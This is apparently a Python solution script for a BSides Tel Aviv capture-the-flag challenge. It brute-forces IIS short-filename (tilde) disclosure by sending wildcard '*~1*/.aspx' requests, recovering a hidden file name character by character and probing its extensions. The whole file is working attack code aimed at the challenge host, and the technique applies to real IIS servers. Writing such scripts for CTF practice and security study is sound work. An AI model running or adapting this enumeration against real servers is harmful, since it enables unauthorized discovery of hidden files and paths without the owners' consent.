import requests
import string
import time
import mimetypes


def recursive_find_chars(filename, bad_char, tree_num):
    begin_len = len(filename)
    filenames = []
    try_chars = []
    for char in string.printable:
        if char not in string.ascii_lowercase.upper() and char not in '#$%&()*+,-.\/:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c':
            try_chars += char
    while True:
        start_len = len(filename)
        for char in try_chars:
            if char != bad_char:
                print('\n-------------------')
                print('Tree num: ', tree_num)
                print('Current filename: ', filename)
                print('Trying char: ', char)
                while True:
                    try:
                        r = requests.get('http://iis.challenges.bsidestlv.com/' + filename + char + '*~1*/.aspx')
                        if r is not None:
                            break
                        else:
                            time.sleep(.3)
                    except Exception:
                        pass
                print(r.text)
                if 'BSidesTLV{' in r.text:
                    raise Exception('FOUND FLAG!!!')
                print(r)
                print('-------------------')
                if r.status_code == 404:
                    recursive_search = recursive_find_chars(filename, char, tree_num + 1)
                    if recursive_search:
                        filenames.append(recursive_search)
                    filename += char
                    break
        if start_len == len(filename):
            break
    if begin_len == len(filename):
        filenames.append(filename)
    return filenames

def find_chars():
    try_chars = ''
    all_chars = string.printable
    for char in all_chars:
        if char not in string.ascii_lowercase.upper() and char not in '#$%&()*+,-.\/:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c':
            try_chars += char
    filename = ''
    #filename = 'l3v3lupah1dd3n'
    while True:
        for char in try_chars:
            print('\n-------------------')
            print('Current filename: ', filename)
            print('Trying char: ', char)
            while True:
                try:
                    r = requests.get('http://iis.challenges.bsidestlv.com/' + filename + char + '*~1*/.aspx')
                    if r is not None:
                        break
                    else:
                        time.sleep(.3)
                except Exception:
                    pass
            print(r.text)
            print(r)
            print('-------------------')
            if r.status_code == 404:
                filename += char
                break
    print('\nFilename: ' + filename)

def try_extensions(exts, exit_on_find=False):
    filename = 'l3v3lupah1dd3n/'
    while True:
        for ext in exts:
            print('\n-------------------')
            print('Trying ext: ', ext)
            while True:
                try:
                    r = requests.get('http://iis.challenges.bsidestlv.com/' + filename + ext)
                    print('http://iis.challenges.bsidestlv.com/' + filename + ext)# + '~1/.aspx')
                    if r is not None:
                        break
                    else:
                        time.sleep(.3)
                except Exception:
                    pass
            print(r.text)
            print(r)
            if r.status_code != 400:
                print('\nRESULT\nRESULT\nRESULT\nRESULT\n')
                if exit_on_find:
                    break
            print('-------------------')
        filename = filename[:-1]

def main():
    filenames = recursive_find_chars('l3v3lu','',0)
    #find_chars()
    print('END RESULT FILENAMES: ' + filenames)
    #try_extensions()
    #try_extensions(mimetypes.types_map, True)
    #try_extensions(['~1/.aspx', '~1.%3F/.aspx', '~1.%3F%3F/.aspx', '~1.%3F%3F%3F/.aspx'])

if __name__ == '__main__':
    main()